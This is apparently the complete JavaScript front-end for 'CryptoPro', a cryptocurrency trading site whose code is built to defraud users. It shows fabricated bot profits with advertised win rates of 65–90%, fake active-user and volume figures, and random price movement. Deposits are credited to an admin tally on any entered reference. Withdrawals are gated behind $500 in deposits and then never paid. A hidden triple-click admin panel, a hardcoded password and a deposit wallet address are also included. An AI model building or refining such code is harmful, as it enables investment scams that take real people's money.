// CryptoPro - Complete Working Version

const CONFIG = {
    ADMIN_PASSWORD: '37757441Fe@',
    MINIMUM_DEPOSIT: 10,
    MINIMUM_BALANCE_FOR_TRADING: 50,
    MINIMUM_TOTAL_DEPOSITS_FOR_WITHDRAWAL: 500,
    ENABLE_TRADING_ROBOTS: true,
    ROBOT_TRADE_INTERVAL: 15000,
    ACTIVE_USERS_BASE: 1247,
    VOLUME_BASE: 97.5,
    STATS_UPDATE_INTERVAL: 5000,
    BINANCE_DEPOSIT_ADDRESS: 'TK4rUz6TUEd7zCWeuiX5R47pSNdPswJnAc'
};

let appState = {
    accountType: 'real',
    isAdmin: false,
    demoBalance: 10000,
    realBalance: 0,
    displayBalance: 0,
    adminWallet: 0,
    userTotalDeposited: 0,
    robotTrades: [],
    totalRobotProfits: 0,
    lastRobotTradeTime: 0,
    selectedBot: 'none',
    availableBots: {
        none: { name: 'Manual Trading', icon: '👤', profitRate: 0, minProfit: 0, maxProfit: 0 },
        conservative: { name: 'Conservative Bot', icon: '🛡️', profitRate: 0.65, minProfit: 3, maxProfit: 15 },
        balanced: { name: 'Balanced Bot', icon: '⚖️', profitRate: 0.75, minProfit: 10, maxProfit: 35 },
        aggressive: { name: 'Aggressive Bot', icon: '🚀', profitRate: 0.85, minProfit: 20, maxProfit: 80 },
        expert: { name: 'Expert AI Bot', icon: '🤖', profitRate: 0.90, minProfit: 30, maxProfit: 120 }
    },
    paymentHistory: [],
    activeUsers: CONFIG.ACTIVE_USERS_BASE,
    volume24h: CONFIG.VOLUME_BASE
};

let cryptoPrices = {
    'BTC/USDT': 64250, 'ETH/USDT': 3420, 'BNB/USDT': 580, 'SOL/USDT': 145,
    'DOGE/USDT': 0.08, 'XAU/USDT': 2045
};

let priceChanges = {
    'BTC/USDT': 2.45, 'ETH/USDT': -1.23, 'BNB/USDT': 0.89, 'SOL/USDT': 3.12,
    'DOGE/USDT': 5.20, 'XAU/USDT': 0.35
};

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    console.log('💎 Loading CryptoPro...');
    loadState();
    setTimeout(() => {
        attachButtons();
        updateUI();
        startUpdates();
        createLivePanel();
        console.log('✅ Ready!');
    }, 100);
});

// Attach Buttons - FIXED
function attachButtons() {
    const buttons = {
        tradeBtn: () => alert('📊 Select a bot first to start trading!'),
        botBtn: () => openBotModal(),
        depositBtn: () => openDepositModal(),
        withdrawBtn: () => openWithdrawModal(),
        demoBtn: () => switchAccount('demo'),
        realBtn: () => switchAccount('real')
    };
    
    Object.keys(buttons).forEach(id => {
        const btn = document.getElementById(id);
        if (btn) {
            btn.onclick = (e) => {
                e.preventDefault();
                buttons[id]();
            };
            console.log('✅ ' + id + ' attached');
        }
    });
    
    // Triple-click balance for admin
    const bal = document.getElementById('totalBalance');
    if (bal) {
        let clicks = 0;
        bal.onclick = () => {
            clicks++;
            if (clicks === 3) {
                clicks = 0;
                promptAdmin();
            }
            setTimeout(() => clicks = 0, 1000);
        };
    }
}

// Toast
function toast(msg, type = 'info') {
    const colors = {
        success: '#00ff88', error: '#ff006e', warning: '#ffa500', info: '#00d9ff'
    };
    const t = document.createElement('div');
    t.style.cssText = `position: fixed; top: 80px; right: 20px; background: ${colors[type]}; color: ${type === 'success' ? '#000' : '#fff'}; padding: 16px 24px; border-radius: 12px; z-index: 10000; font-weight: 600; animation: slideIn 0.3s;`;
    t.textContent = msg;
    document.body.appendChild(t);
    setTimeout(() => t.remove(), 3000);
}

// Deposit Modal
function openDepositModal() {
    if (appState.accountType === 'demo') {
        if (confirm('Switch to REAL account?')) {
            switchAccount('real');
            setTimeout(openDepositModal, 300);
        }
        return;
    }
    
    const m = document.createElement('div');
    m.className = 'modal active';
    m.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h2>💰 Deposit</h2>
                <button class="close-btn" onclick="this.closest('.modal').remove()">×</button>
            </div>
            <div class="modal-body">
                <div class="form-group">
                    <label>Amount (USD)</label>
                    <input type="number" id="depAmt" min="10" placeholder="Min: $10">
                </div>
                <div class="form-group">
                    <label>Payment Method</label>
                    <select id="depMethod">
                        <option>🪙 Cryptocurrency</option>
                        <option>📱 M-Pesa</option>
                        <option>💳 Card</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>Reference</label>
                    <input type="text" id="depRef" placeholder="Transaction ID">
                </div>
                <button class="btn btn-primary btn-full" id="confirmDep">CONFIRM DEPOSIT</button>
            </div>
        </div>
    `;
    document.body.appendChild(m);
    
    setTimeout(() => {
        document.getElementById('confirmDep').onclick = () => {
            const amt = parseFloat(document.getElementById('depAmt').value);
            const ref = document.getElementById('depRef').value;
            if (amt >= 10 && ref) {
                appState.displayBalance += amt;
                appState.realBalance += amt;
                appState.adminWallet += amt;
                appState.userTotalDeposited += amt;
                appState.paymentHistory.push({amt, ref, time: new Date().toISOString()});
                saveState();
                updateUI();
                m.remove();
                toast(`✅ Deposited $${amt.toFixed(2)}!`, 'success');
            } else {
                toast('❌ Invalid amount or reference', 'error');
            }
        };
    }, 100);
}

// Withdraw
function openWithdrawModal() {
    if (appState.accountType === 'demo') {
        toast('⚠️ Switch to REAL account', 'warning');
        return;
    }
    
    if (appState.userTotalDeposited < CONFIG.MINIMUM_TOTAL_DEPOSITS_FOR_WITHDRAWAL) {
        const need = CONFIG.MINIMUM_TOTAL_DEPOSITS_FOR_WITHDRAWAL - appState.userTotalDeposited;
        if (confirm(`Need $${need.toFixed(2)} more deposits. Deposit now?`)) {
            openDepositModal();
        }
        return;
    }
    
    const amt = prompt(`Available: $${appState.displayBalance.toFixed(2)}\n\nWithdraw amount?`);
    if (amt && parseFloat(amt) >= 10) {
        toast(`✅ Withdrawal requested: $${amt}`, 'success');
    }
}

// Bot Modal
function openBotModal() {
    const m = document.createElement('div');
    m.className = 'modal active';
    m.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h2>🤖 Select Bot</h2>
                <button class="close-btn" onclick="this.closest('.modal').remove()">×</button>
            </div>
            <div class="modal-body">
                ${Object.keys(appState.availableBots).map(k => {
                    const b = appState.availableBots[k];
                    const sel = appState.selectedBot === k;
                    return `<div class="bot-card ${sel ? 'selected' : ''}" data-bot="${k}" style="background: ${sel ? 'rgba(0,255,136,0.2)' : 'rgba(10,25,45,0.6)'}; border: 2px solid ${sel ? '#00ff88' : 'rgba(100,200,255,0.2)'}; padding: 20px; border-radius: 16px; margin-bottom: 16px; cursor: pointer;">
                        <div style="display: flex; align-items: center; gap: 16px;">
                            <div style="font-size: 36px;">${b.icon}</div>
                            <div style="flex: 1;">
                                <div style="font-size: 18px; font-weight: 700;">${b.name}</div>
                                ${k !== 'none' ? `<div style="font-size: 12px; opacity: 0.7;">${(b.profitRate * 100).toFixed(0)}% win rate • $${b.minProfit}-${b.maxProfit} per trade</div>` : ''}
                            </div>
                            ${sel ? '<div style="color: #00ff88; font-size: 24px;">✓</div>' : ''}
                        </div>
                    </div>`;
                }).join('')}
                <button class="btn btn-primary btn-full" onclick="this.closest('.modal').remove()">CONFIRM</button>
            </div>
        </div>
    `;
    document.body.appendChild(m);
    
    setTimeout(() => {
        document.querySelectorAll('.bot-card').forEach(c => {
            c.onclick = () => {
                appState.selectedBot = c.dataset.bot;
                saveState();
                updateBotStatus();
                m.remove();
                setTimeout(openBotModal, 100);
                if (c.dataset.bot !== 'none') {
                    toast(`✅ ${appState.availableBots[c.dataset.bot].name} activated!`, 'success');
                }
            };
        });
    }, 100);
}

// Live Panel
function createLivePanel() {
    const p = document.createElement('div');
    p.id = 'livePanel';
    p.style.cssText = 'position: fixed; bottom: 80px; right: 20px; width: 350px; max-height: 450px; background: rgba(20,35,60,0.98); border: 2px solid rgba(0,217,255,0.3); border-radius: 16px; padding: 20px; z-index: 998; overflow-y: auto;';
    p.innerHTML = `
        <h3 style="color: #00d9ff; font-size: 16px; margin-bottom: 16px;">🤖 LIVE BOT ACTIVITY</h3>
        <div style="background: rgba(0,255,136,0.1); border: 1px solid rgba(0,255,136,0.3); border-radius: 12px; padding: 12px; margin-bottom: 16px;">
            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; font-size: 12px;">
                <div><div style="opacity: 0.7;">Total Trades</div><div id="totalTrades" style="font-size: 18px; font-weight: 700; color: #00ff88;">0</div></div>
                <div><div style="opacity: 0.7;">Total Profit</div><div id="totalProfit" style="font-size: 18px; font-weight: 700; color: #00ff88;">+$0.00</div></div>
            </div>
        </div>
        <div id="tradesList"></div>
    `;
    document.body.appendChild(p);
}

function updateLivePanel() {
    const list = document.getElementById('tradesList');
    const total = document.getElementById('totalTrades');
    const profit = document.getElementById('totalProfit');
    
    if (!list) return;
    
    total.textContent = appState.robotTrades.length;
    profit.textContent = (appState.totalRobotProfits >= 0 ? '+' : '') + '$' + appState.totalRobotProfits.toFixed(2);
    profit.style.color = appState.totalRobotProfits >= 0 ? '#00ff88' : '#ff006e';
    
    list.innerHTML = appState.robotTrades.slice(0, 10).map(t => `
        <div style="background: ${t.profit > 0 ? 'rgba(0,255,136,0.05)' : 'rgba(255,0,110,0.05)'}; border-left: 3px solid ${t.profit > 0 ? '#00ff88' : '#ff006e'}; padding: 12px; border-radius: 8px; margin-bottom: 8px;">
            <div style="display: flex; justify-content: space-between;">
                <strong>${t.pair}</strong>
                <span style="color: ${t.profit > 0 ? '#00ff88' : '#ff006e'}; font-weight: 700;">${t.profit > 0 ? '+' : ''}$${t.profit.toFixed(2)}</span>
            </div>
            <div style="font-size: 11px; opacity: 0.7; margin-top: 4px;">${t.botName} • ${getTimeAgo(new Date(t.timestamp))}</div>
        </div>
    `).join('') || '<div style="text-align: center; padding: 40px; opacity: 0.5;"><div style="font-size: 40px;">🤖</div><div>Select a bot to start</div></div>';
}

function getTimeAgo(date) {
    const s = Math.floor((new Date() - date) / 1000);
    if (s < 60) return s + 's ago';
    if (s < 3600) return Math.floor(s / 60) + 'm ago';
    return Math.floor(s / 3600) + 'h ago';
}

// Robot Trading
function simulateRobotTrade() {
    if (appState.selectedBot === 'none' || appState.accountType !== 'real' || appState.displayBalance < 50) return;
    
    const now = Date.now();
    if (now - appState.lastRobotTradeTime < CONFIG.ROBOT_TRADE_INTERVAL) return;
    
    appState.lastRobotTradeTime = now;
    const bot = appState.availableBots[appState.selectedBot];
    const pairs = Object.keys(cryptoPrices);
    const pair = pairs[Math.floor(Math.random() * pairs.length)];
    const isWin = Math.random() < bot.profitRate;
    const profit = isWin ? bot.minProfit + Math.random() * (bot.maxProfit - bot.minProfit) : -(bot.minProfit * 0.3);
    
    const trade = {
        id: 'bot_' + Date.now(),
        pair, profit,
        timestamp: new Date().toISOString(),
        botName: bot.name,
        botIcon: bot.icon
    };
    
    appState.displayBalance += profit;
    appState.totalRobotProfits += profit;
    appState.robotTrades.unshift(trade);
    if (appState.robotTrades.length > 20) appState.robotTrades = appState.robotTrades.slice(0, 20);
    
    saveState();
    updateUI();
    updateLivePanel();
    
    if (profit > 0) showTradeNotif(trade);
}

function showTradeNotif(t) {
    const n = document.createElement('div');
    n.style.cssText = `position: fixed; top: 80px; right: 20px; background: linear-gradient(135deg, #00ff88, #00cc6a); color: #000; padding: 16px 20px; border-radius: 12px; z-index: 9999; font-weight: bold; animation: slideIn 0.3s;`;
    n.innerHTML = `<div style="display: flex; gap: 12px;"><div style="font-size: 24px;">${t.botIcon}</div><div><div style="font-size: 14px;">${t.botName}</div><div style="font-size: 12px; opacity: 0.8;">${t.pair} • +$${t.profit.toFixed(2)}</div></div></div>`;
    document.body.appendChild(n);
    setTimeout(() => n.remove(), 4000);
}

// Updates
function startUpdates() {
    setInterval(updatePrices, 2000);
    setInterval(updateStats, CONFIG.STATS_UPDATE_INTERVAL);
    if (CONFIG.ENABLE_TRADING_ROBOTS) setInterval(simulateRobotTrade, CONFIG.ROBOT_TRADE_INTERVAL);
}

function updateStats() {
    appState.activeUsers = Math.max(100, CONFIG.ACTIVE_USERS_BASE + Math.floor(Math.random() * 21) - 10);
    appState.volume24h = Math.max(50, CONFIG.VOLUME_BASE + (Math.random() - 0.5) * 5);
    
    const u = document.querySelector('.live-stats .stat:nth-child(1) .stat-value');
    const v = document.querySelector('.live-stats .stat:nth-child(2) .stat-value');
    if (u) u.textContent = appState.activeUsers.toLocaleString();
    if (v) v.textContent = '$' + appState.volume24h.toFixed(1) + 'M';
}

function updatePrices() {
    Object.keys(cryptoPrices).forEach(pair => {
        const old = cryptoPrices[pair];
        const change = (Math.random() - 0.5) * 20;
        cryptoPrices[pair] = Math.max(old + change, old * 0.95);
        priceChanges[pair] = ((cryptoPrices[pair] - old) / old) * 100;
        
        const key = pair.split('/')[0].toLowerCase();
        const pe = document.getElementById(key + 'Price');
        const ce = document.getElementById(key + 'Change');
        if (pe) pe.textContent = '$' + cryptoPrices[pair].toFixed(cryptoPrices[pair] < 1 ? 4 : 2);
        if (ce) {
            ce.textContent = (priceChanges[pair] >= 0 ? '+' : '') + priceChanges[pair].toFixed(2) + '%';
            ce.className = 'asset-change ' + (priceChanges[pair] >= 0 ? 'positive' : 'negative');
        }
    });
}

// UI
function updateUI() {
    const bal = appState.accountType === 'demo' ? appState.demoBalance : appState.displayBalance;
    const be = document.getElementById('totalBalance');
    if (be) be.textContent = '$' + bal.toFixed(2);
    
    const ue = document.getElementById('usdtAmount');
    if (ue) ue.textContent = bal.toFixed(2) + ' USDT';
    
    const ve = document.getElementById('usdtValue');
    if (ve) ve.textContent = '$' + bal.toFixed(2);
    
    updateBotStatus();
}

function updateBotStatus() {
    let s = document.getElementById('botStatus');
    if (!s) {
        s = document.createElement('div');
        s.id = 'botStatus';
        s.style.cssText = 'position: fixed; bottom: 20px; left: 20px; background: rgba(20,35,60,0.95); border: 2px solid #a855f7; border-radius: 12px; padding: 12px 16px; z-index: 999;';
        document.body.appendChild(s);
    }
    
    if (appState.selectedBot === 'none') {
        s.style.display = 'none';
    } else {
        s.style.display = 'block';
        const b = appState.availableBots[appState.selectedBot];
        s.innerHTML = `<div style="display: flex; gap: 10px;"><div style="font-size: 20px;">${b.icon}</div><div><div style="font-size: 12px; font-weight: 700; color: #a855f7;">${b.name}</div><div style="font-size: 10px; color: rgba(255,255,255,0.6);">🟢 Active</div></div></div>`;
    }
}

function switchAccount(type) {
    appState.accountType = type;
    const db = document.getElementById('demoBtn');
    const rb = document.getElementById('realBtn');
    if (db) db.classList.toggle('active', type === 'demo');
    if (rb) rb.classList.toggle('active', type === 'real');
    saveState();
    updateUI();
    toast(`Switched to ${type.toUpperCase()}`, 'info');
}

// Admin
function promptAdmin() {
    const p = prompt('Admin Password:');
    if (p === CONFIG.ADMIN_PASSWORD) {
        appState.isAdmin = true;
        toast('✅ Admin access granted!', 'success');
        alert(`Admin Wallet: $${appState.adminWallet.toFixed(2)}\nDisplay Balance: $${appState.displayBalance.toFixed(2)}\nTotal Deposits: $${appState.userTotalDeposited.toFixed(2)}`);
    }
}

// Storage
function saveState() {
    const s = {...appState};
    delete s.isAdmin;
    localStorage.setItem('cryptoProApp', JSON.stringify(s));
}

function loadState() {
    const s = localStorage.getItem('cryptoProApp');
    if (s) {
        try {
            appState = {...appState, ...JSON.parse(s), isAdmin: false};
        } catch(e) {
            console.error('Load error:', e);
        }
    }
}

// CSS
const style = document.createElement('style');
style.textContent = `
    @keyframes slideIn { from { transform: translateX(400px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
    .bot-card { transition: all 0.3s; }
    .bot-card:hover { transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0,217,255,0.3); }
`;
document.head.appendChild(style);
